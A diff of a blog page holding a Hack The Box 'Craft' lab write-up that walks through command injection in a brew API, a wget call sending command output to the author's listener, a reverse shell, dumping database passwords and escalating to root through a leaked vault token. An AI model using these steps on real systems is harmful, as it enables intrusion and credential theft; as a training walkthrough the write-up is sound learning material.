@@ -121,7 +121,7 @@ part is quit easier and involve to interact with a vault instance.</p>
 <h1 id="user">User</h1>
 <h2 id="recon">Recon</h2>
 <p>We start with an nmap scan. Only the ports 22, 6022 (SSH) and 443 (HTTPS) are open.</p>
-<div class="highlight"><pre><span class="code-line"><span></span># Nmap 7.80 scan initiated Fri Nov  8 15:33:42 2019 as: nmap -p- -sSV -oA 10.10.10.110 10.10.10.110</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Fri Nov  8 15:33:42 2019 as: nmap -p- -sSV -oA 10.10.10.110 10.10.10.110</span>
 <span class="code-line">Nmap scan report for 10.10.10.110</span>
 <span class="code-line">Host is up (0.15s latency).</span>
 <span class="code-line">Not shown: 65532 closed ports</span>
@@ -136,7 +136,7 @@ part is quit easier and involve to interact with a vault instance.</p>
 <span class="code-line"></span>
 <span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
 <span class="code-line"># Nmap done at Fri Nov  8 15:45:26 2019 -- 1 IP address (1 host up) scanned in 704.14 seconds</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="web">Web</h2>
@@ -149,13 +149,13 @@ public rest API as well as a brew submission process, but for now, check out our
 <p>There is also a link to a <a href="https://gogs.io/">gogs</a> as well as the API. This
 links redirect to some subdomain. Let us add some informations in our
 <code>/etc/hosts</code>.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>cat /etc/hosts</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat /etc/hosts</span>
 <span class="code-line">127.0.0.1   localhost</span>
 <span class="code-line">127.0.1.1   kalili</span>
 <span class="code-line">10.10.10.110    craft.htb</span>
 <span class="code-line">10.10.10.110    api.craft.htb</span>
 <span class="code-line">10.10.10.110    gogs.craft.htb</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="gogs">GOGS</h2>
@@ -169,7 +169,7 @@ quote are a bit a pain in the ass here. Nevertheless we can validate the code
 execution using a python simpleHTTPserver on our end and execute <code>wget 10.10.14.51:8081/$(&lt;command&gt;)</code>
 server side.</p>
 <p>At least we get a reverse shell.</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="ch">#!/usr/bin/env python</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/usr/bin/env python</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="kn">import</span> <span class="nn">requests</span></span>
 <span class="code-line"><span class="kn">import</span> <span class="nn">json</span></span>
@@ -204,12 +204,12 @@ server side.</p>
 <span class="code-line"><span class="k">print</span> <span class="n">json_data</span></span>
 <span class="code-line"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;https://api.craft.htb/api/brew/&#39;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json_data</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span></span>
 <span class="code-line"><span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="api-reverse-shell">API: reverse shell</h2>
 <p>Once we get a relay on the box we notice that we are root… but in a docker.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>cat release_agent</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat release_agent</span>
 <span class="code-line">/var/lib/docker/overlay2/28e271a4328612a47294bbae8c8b7f01470e29454eef499b5beda147a55000e0/diff/c</span>
 <span class="code-line">uname -a</span>
 <span class="code-line">Linux 5a3d243127f5 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 Linux</span>
@@ -224,12 +224,12 @@ server side.</p>
 <span class="code-line">3:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
 <span class="code-line">2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
 <span class="code-line">1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="mysql">MySQL</h2>
 <p>We explorer the application folder and found some database settings.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>cat craft_api/settings.py</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>cat craft_api/settings.py</span>
 <span class="code-line"># Flask settings</span>
 <span class="code-line">FLASK_SERVER_NAME = &#39;api.craft.htb&#39;</span>
 <span class="code-line">FLASK_DEBUG = False  # Do not use debug mode in production</span>
@@ -247,7 +247,7 @@ server side.</p>
 <span class="code-line">MYSQL_DATABASE_DB = &#39;craft&#39;</span>
 <span class="code-line">MYSQL_DATABASE_HOST = &#39;db&#39;</span>
 <span class="code-line">SQLALCHEMY_TRACK_MODIFICATIONS = False</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>In order to have a "better" shell we can use <code>/bin/sh -i</code></p>
@@ -255,27 +255,27 @@ server side.</p>
 database. We cat that script in a new one in order to change the SQL line to
 list the <code>users</code>'s table. At first I tried with a <code>from users</code>. As there was no
 result I tried with the following:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>/opt/app # head -n 15 dbtest.py &gt; dbtest2.py</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>/opt/app # head -n 15 dbtest.py &gt; dbtest2.py</span>
 <span class="code-line">/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py</span>
 <span class="code-line">/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py</span>
 <span class="code-line">/opt/app # tail -n 6 dbtest.py &gt;&gt; dbtest2.py</span>
 <span class="code-line">/opt/app # python dbtest2.py</span>
 <span class="code-line">{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We get only one user because the <code>dbtest.py</code> script use the <code>cursor.fetchone()</code> function.
 The <code>pymysql</code> <a href="https://pymysql.readthedocs.io/en/latest/modules/cursors.html">documentation</a>
 indicate that we want to use the <code>cursor.fetchall()</code> function. We modify our
 "script":</p>
-<div class="highlight"><pre><span class="code-line"><span></span>/opt/app # head -n 15 dbtest.py &gt; dbtest2.py</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>/opt/app # head -n 15 dbtest.py &gt; dbtest2.py</span>
 <span class="code-line">/opt/app # echo &#39;        sql = &quot;SELECT * from user&quot;&#39; &gt;&gt;dbtest2.py</span>
 <span class="code-line">/opt/app # echo &#39;        cursor.execute(sql)&#39;&gt;&gt;dbtest2.py</span>
 <span class="code-line">/opt/app # echo &#39;        result = cursor.fetchall()&#39;&gt;&gt;dbtest2.py</span>
 <span class="code-line">/opt/app # tail -n 4 dbtest.py &gt;&gt;dbtest2.py</span>
 <span class="code-line">/opt/app # python dbtest2.py</span>
 <span class="code-line">[{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}, {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}, {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}]</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We can then connect to the GOGS with the <code>gilfoyle</code> credentials.</p>
@@ -284,7 +284,7 @@ SSH key. The key is protected by a passphrase. That passhrase is his password!
 We need to copy his private and public key in our <code>.ssh</code> folder. We also need to
 change the private key permission (<code>chmod 600</code>). We can then SSH to the machine
 and get the user flag:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>ssh craft.htb -l gilfoyle</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh craft.htb -l gilfoyle</span>
 <span class="code-line"></span>
 <span class="code-line"></span>
 <span class="code-line">  .   *   ..  . *  *</span>
@@ -316,14 +316,14 @@ and get the user flag:</p>
 <span class="code-line">user.txt</span>
 <span class="code-line">gilfoyle@craft:~$ cat user.txt</span>
 <span class="code-line">bbf4b&lt;redacted&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="getting-root">getting root</h1>
 <h2 id="enumeration">enumeration</h2>
 <p>When listing the <code>gilfoyle</code> home folder we found a <code>.vault-token</code> file
 containing a <a href="https://www.vaultproject.io/">vault</a> token.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>gilfoyle@craft:~$ ls -al</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ ls -al</span>
 <span class="code-line">total 36</span>
 <span class="code-line">drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .</span>
 <span class="code-line">drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..</span>
@@ -336,12 +336,12 @@ containing a <a href="https://www.vaultproject.io/">vault</a> token.</p>
 <span class="code-line">-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo</span>
 <span class="code-line">gilfoyle@craft:~$ cat .vault-token</span>
 <span class="code-line">f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="vault">Vault</h2>
 <p>In order to use vault, when need to authenticate ourself with the token.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>gilfoyle@craft:~$ vault login</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ vault login</span>
 <span class="code-line">Token (will be hidden):</span>
 <span class="code-line">Success! You are now authenticated. The token information displayed below</span>
 <span class="code-line">is already stored in the token helper. You do NOT need to run &quot;vault login&quot;</span>
@@ -356,7 +356,7 @@ containing a <a href="https://www.vaultproject.io/">vault</a> token.</p>
 <span class="code-line">token_policies       [&quot;root&quot;]</span>
 <span class="code-line">identity_policies    []</span>
 <span class="code-line">policies             [&quot;root&quot;]</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We are member of the vault's
@@ -365,7 +365,7 @@ meaning that we can access everything stored on the vault.</p>
 <p>The vault is unsealed. Therefore we can directly access to the data. If this vault
 was sealed we will need 3 of the 5 keys to unsealed
 the vault (with the <em>shamir</em> seal type).</p>
-<div class="highlight"><pre><span class="code-line"><span></span>gilfoyle@craft:~$ vault status</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ vault status</span>
 <span class="code-line">Key             Value</span>
 <span class="code-line">---             -----</span>
 <span class="code-line">Seal Type       shamir</span>
@@ -377,11 +377,11 @@ the vault (with the <em>shamir</em> seal type).</p>
 <span class="code-line">Cluster Name    vault-cluster-cb7e66f9</span>
 <span class="code-line">Cluster ID      8bb98351-0148-3c42-d124-45a87dc43db7</span>
 <span class="code-line">HA Enabled      false</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We can list the secret engine enable on the vault.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>gilfoyle@craft:~$ vault secrets list</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ vault secrets list</span>
 <span class="code-line">Path          Type         Accessor              Description</span>
 <span class="code-line">----          ----         --------              -----------</span>
 <span class="code-line">cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage</span>
@@ -389,13 +389,13 @@ the vault (with the <em>shamir</em> seal type).</p>
 <span class="code-line">secret/       kv           kv_2d9b0109           key/value secret storage</span>
 <span class="code-line">ssh/          ssh          ssh_3bbd5276          n/a</span>
 <span class="code-line">sys/          system       system_477ec595       system endpoints used for control, policy and debugging</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>In the <code>craf-infra</code> repository there is a <code>vault</code> folder containing a
 <code>secret.sh</code> file. This file show wich secrets are created: An ssh acces for the
 root user.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>craft-infra/vault# cat secrets.sh</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>craft-infra/vault# cat secrets.sh</span>
 <span class="code-line">#!/bin/bash</span>
 <span class="code-line"></span>
 <span class="code-line"># set up vault secrets backend</span>
@@ -406,13 +406,13 @@ root user.</p>
 <span class="code-line">    key_type=otp \</span>
 <span class="code-line">    default_user=root \</span>
 <span class="code-line">    cidr_list=0.0.0.0/0</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>Therefore we just need to use the <code>vault</code>'s <code>ssh</code> command to connect as <code>root</code>
 on <code>localhost</code> with the <code>otp</code> mode. We are root on the machine and can access
 the flag.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>gilfoyle@craft:~$ vault ssh -mode=otp root@127.0.0.1</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>gilfoyle@craft:~$ vault ssh -mode=otp root@127.0.0.1</span>
 <span class="code-line">WARNING: No -role specified. Use -role to tell Vault which ssh role to use for</span>
 <span class="code-line">authentication. In the future, you will need to tell Vault which role to use.</span>
 <span class="code-line">For now, Vault will attempt to guess based on the API response. This will be</span>
@@ -452,7 +452,7 @@ the flag.</p>
 <span class="code-line">Last login: Tue Aug 27 04:53:14 2019</span>
 <span class="code-line">root@craft:~# cat root.txt</span>
 <span class="code-line">831d6&lt;redacted&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="wrapping-up">Wrapping up</h1>
@@ -542,139 +542,52 @@ me to learn more about <a href="https://www.vaultproject.io">vault</a>.</p>
 
     <ul>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/screen.html">screen</a>
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/security.html">security</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vault.html">vault</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/hash.html">hash</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/htb.html">HTB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/cve.html">cve</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/api.html">api</a>
             </li>
             <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/misc.html">misc</a>
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/procdump.html">procdump</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/drupal.html">drupal</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/server.html">server</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/git.html">git</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/programming.html">programming</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/leak.html">leak</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/devops.html">devops</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/smb.html">smb</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/suid.html">SUID</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mail.html">mail</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/blog.html">blog</a>
@@ -683,40 +596,127 @@ me to learn more about <a href="https://www.vaultproject.io">vault</a>.</p>
               <a href="https://maggick.fr/tag/code-review.html">code review</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/python.html">python</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/windows.html">windows</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/waf.html">WAF</a>
             </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
             </li>
     </ul>
 </section>
